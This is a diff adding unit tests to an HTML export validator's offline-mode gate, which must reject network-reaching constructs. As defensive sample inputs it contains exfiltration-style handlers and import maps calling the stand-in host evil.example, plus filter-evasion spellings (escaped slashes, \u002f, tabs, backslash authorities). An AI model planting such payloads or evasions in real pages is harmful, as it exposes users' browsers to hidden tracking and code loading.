@@ -204,6 +204,130 @@ class NewCheckTests(unittest.TestCase):
                 self.assertTrue(any("self-contained guarantee" in e and "<script %s" % attr in e
                                     for e in errors), (attr, errors))
 
+    # A `speculationrules` or `importmap` block is ACTIVE but is not JavaScript, so the
+    # executable-type predicate never looked at it: a speculation ruleset makes the browser
+    # prefetch/prerender (a `"source": "document"` one needs no URL literal at all), and an import
+    # map re-points where a bare module specifier resolves - which the literal
+    # `import "https://..."` scan cannot see. The exporter removes every ruleset and every import
+    # map that is not entirely relative, so the gate must reject a hand-authored offline file that
+    # keeps one, in every spelling JSON allows.
+    def test_offline_mode_rejects_active_data_blocks(self):
+        cases = (
+            ("speculationrules", "", '{"prerender": [{"urls": ["https://evil.example/beacon"]}]}'),
+            # No URL literal anywhere: the ruleset prefetches the document's own links.
+            ("speculationrules", "", '{"prefetch": [{"source": "document"}]}'),
+            # Even a purely relative ruleset goes: it exists only to fetch.
+            ("speculationrules", "", '{"prerender": [{"urls": ["next.html"]}]}'),
+            # An external ruleset or map is unreviewable and cannot be self-contained.
+            ("speculationrules", ' src="rules.json"', ""),
+            ("importmap", ' src="map.json"', '{"imports": {"lib": "./lib.js"}}'),
+            ("importmap", "", '{"imports": {"lib": "https://evil.example/lib.js"}}'),
+            ("importmap", "", '{"imports": {"lib": "//evil.example/lib.js"}}'),
+            # A backslash opens an authority for a special scheme exactly as a slash does.
+            ("importmap", "", '{"imports": {"lib": "/\\\\evil.example/lib.js"}}'),
+            # JSON permits an escaped solidus and a \\uXXXX escape for any character, and the URL
+            # parser strips padding and an embedded tab - a text scan closes one of these.
+            ("importmap", "", '{"imports": {"lib": "https:\\/\\/evil.example/lib.js"}}'),
+            ("importmap", "", '{"imports": {"lib": "https:\\u002f\\u002fevil.example/lib.js"}}'),
+            ("importmap", "", '{"imports": {"lib": "  https://evil.example/lib.js"}}'),
+            ("importmap", "", '{"imports": {"lib": "htt\\tps://evil.example/lib.js"}}'),
+            # A data:/blob: target maps a bare specifier onto code the document never carried.
+            ("importmap", "", '{"imports": {"lib": "data:text/javascript,export default 1"}}'),
+            ("importmap", "", '{"imports": {"lib": "blob:https://evil.example/x"}}'),
+            # A scopes KEY is a reference too.
+            ("importmap", "", '{"scopes": {"https://cdn.example/": {"lib": "./lib.js"}}}'),
+            # A browser hard-fails an unparseable map, so failing closed loses nothing.
+            ("importmap", "", "not json at all"),
+        )
+        for stype, attr, body in cases:
+            with self.subTest(type=stype, attr=attr, body=body):
+                block = '<script type="%s"%s>%s</script>' % (stype, attr, body)
+                errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, block))))
+                self.assertTrue(any("offline mode" in e and stype in e for e in errors),
+                                (stype, attr, body, errors))
+
+    # The controls: an entirely relative import map is legitimate content and must survive, and a
+    # MIME-parameter type is NOT one of these keyword types, so it is inert data a browser ignores
+    # and the gate must leave alone (deleting an author's inert block is the costlier error).
+    def test_offline_mode_accepts_local_and_parameterized_active_data_blocks(self):
+        blocks = (
+            '<script type="importmap">{"imports": {"lib": "./lib.js", "app": "/app.js"}}</script>',
+            '<script type="importmap">{"scopes": {"/inner/": {"lib": "./inner.js"}}}</script>',
+            '<script type="importmap;charset=utf-8">'
+            '{"imports": {"lib": "https://evil.example/lib.js"}}</script>',
+            '<script type="text/plain">{"prerender": [{"urls": ["https://evil.example/x"]}]}</script>',
+        )
+        errors, warnings = self._errs_warns(
+            with_offline_mode(build(body=self._body(MAIN, "\n".join(blocks)))))
+        self.assertEqual(errors, [], errors)
+        self.assertEqual(warnings, [], warnings)
+
+    # `<template>` content is preserved verbatim by serialization and a second script can adopt
+    # and insert it, so the exporter's inline-egress scan now descends into it. The validator's
+    # parser deliberately drops template content, so it could not see such a script at all - which
+    # is exactly the disagreement that would let --strict bless a file the exporter strips.
+    def test_offline_egress_check_sees_a_template_parked_script(self):
+        cases = (
+            ('<script type="text/javascript">import("https://evil.example/x.js");</script>',
+             "imports a network module"),
+            ('<script type="text/javascript">window.location.href = "https://evil.example/steal";</script>',
+             "direct top-level "),
+            ('<script type="importmap">{"imports": {"lib": "https://evil.example/lib.js"}}</script>',
+             "importmap"),
+            ('<script type="speculationrules">{"prefetch": [{"source": "document"}]}</script>',
+             "speculationrules"),
+        )
+        for inner, needle in cases:
+            with self.subTest(inner=inner):
+                block = "<template id=\"parked\">\n%s\n</template>" % inner
+                errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, block))))
+                self.assertTrue(any(needle in e for e in errors), (inner, errors))
+                # ...and the same block nested a second template deep, which is what the exporter's
+                # recursive walk exists for.
+                nested = "<template id=\"outer\"><template id=\"inner\">\n%s\n</template></template>" % inner
+                errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, nested))))
+                self.assertTrue(any(needle in e for e in errors), ("nested", inner, errors))
+
+    def test_offline_check_sees_template_parked_network_css(self):
+        block = ('<template id="parked-css">\n'
+                 "<style>.x { background-image: url(https://evil.example/bg.png); }</style>\n"
+                 '<p style="background: url(//evil.example/inline.png)">x</p>\n'
+                 "</template>")
+        errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, block))))
+        for needle in ("style block", "inline style"):
+            self.assertTrue(any("offline mode" in e and "url(" in e and needle in e for e in errors),
+                            (needle, errors))
+
+    # The control: a template holding only local content is legitimate and must stay clean.
+    def test_offline_check_accepts_a_local_template(self):
+        block = ('<template id="ok">\n'
+                 '<style>.x { color: #123456; }</style>\n'
+                 '<script type="text/javascript">window.__ok = 1;</script>\n'
+                 '<script type="importmap">{"imports": {"lib": "./lib.js"}}</script>\n'
+                 '<img src="data:image/png;base64,AAAA" alt="x">\n'
+                 "</template>")
+        errors, warnings = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, block))))
+        self.assertEqual(errors, [], errors)
+        self.assertEqual(warnings, [], warnings)
+
+    # The exporter removes every `on*` attribute; a gate that did not look would certify a
+    # hand-authored offline file the export would have changed - and an inline handler is exactly
+    # the channel the offline CSP cannot close.
+    def test_offline_mode_rejects_inline_event_handlers(self):
+        for block in ('<button id="go" onclick="location.href=\'https://evil.example/x\'">go</button>',
+                      '<img id="pixel" alt="x" src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" '
+                      'onload="location.href=\'https://evil.example/x\'">',
+                      '<template id="parked-handler"><button onclick="alert(1)">go</button></template>'):
+            with self.subTest(block=block):
+                errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, block))))
+                self.assertTrue(any("inline event handler" in e for e in errors), (block, errors))
+
+    def test_offline_mode_accepts_a_document_without_event_handlers(self):
+        block = '<button id="go" data-onclick="not a handler">go</button>'
+        errors, warnings = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, block))))
+        self.assertEqual(errors, [], errors)
+        self.assertEqual(warnings, [], warnings)
+
     def test_external_stylesheet_link_warns(self):
         link = '<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=X">'
         errors, warnings = self._errs_warns(build(body=self._body(MAIN, link)))
